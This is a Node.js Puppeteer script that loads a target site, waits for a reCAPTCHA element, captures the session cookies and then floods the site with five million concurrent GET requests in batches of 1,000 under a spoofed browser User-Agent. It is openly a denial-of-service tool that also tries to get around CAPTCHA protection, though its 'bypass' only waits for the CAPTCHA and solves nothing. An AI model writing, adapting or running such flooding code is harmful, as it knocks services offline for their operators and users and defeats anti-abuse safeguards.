const puppeteer = require('puppeteer');

// Target URL
const targetUrl = 'https://example.com'; // Replace with the target URL

// Function to send a single HTTP request
async function sendRequest(url, headers, method = 'GET', body = null) {
  try {
    const response = await fetch(url, {
      method: method,          // GET, POST, etc.
      headers: headers,        // Custom headers (including cookies)
      body: body ? JSON.stringify(body) : null,  // POST/PUT body if needed
    });
    if (response.ok) {
      console.log(`Request Success: Status: ${response.status}`);
    } else {
      console.log(`Request Failed: Status: ${response.status}`);
    }
  } catch (error) {
    console.error('Request failed: ', error);
  }
}

// Function to bypass CAPTCHA and get valid session cookies
async function bypassCaptchaAndFlood() {
  // Launch Puppeteer browser
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  // Navigate to the target URL (CAPTCHA page might appear here)
  await page.goto(targetUrl, { waitUntil: 'domcontentloaded' });

  // Wait for CAPTCHA to appear (change selector based on CAPTCHA)
  await page.waitForSelector('div#g-recaptcha');  // Adjust if needed
  console.log("Bypassing CAPTCHA...");

  // Capture session cookies after CAPTCHA is solved
  const cookies = await page.cookies();
  console.log('Captured Cookies:', cookies);

  // Close Puppeteer browser after CAPTCHA bypass
  await browser.close();

  // Once CAPTCHA is bypassed, start flooding requests
  floodRequests(cookies);
}

// Function to flood the site with requests using concurrency
async function floodRequests(cookies) {
  const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept': 'application/json',
    'Cookie': cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; '),
    'Content-Type': 'application/json',
  };

  // Number of requests in total (5 million)
  const totalRequests = 5000000; // You can adjust this number
  const batchSize = 1000;  // Number of requests per batch
  const delayBetweenBatches = 1000;  // Delay in ms between batches (adjust if needed)

  let batchCount = Math.ceil(totalRequests / batchSize);

  // Function to handle batches of requests
  const sendBatch = async (batchIndex) => {
    const requests = [];
    for (let i = 0; i < batchSize; i++) {
      // Each request will be a concurrent fetch operation
      requests.push(sendRequest(targetUrl, headers, 'GET'));
    }
    // Wait for all requests in the batch to complete
    await Promise.all(requests);
    console.log(`Batch ${batchIndex + 1} completed.`);

    if (batchIndex < batchCount - 1) {
      // Add a slight delay before the next batch (staggered)
      setTimeout(() => sendBatch(batchIndex + 1), delayBetweenBatches);
    }
  };

  // Start flooding the requests in batches
  sendBatch(0);  // Start with the first batch
}

// Start the process
bypassCaptchaAndFlood().catch(console.error);
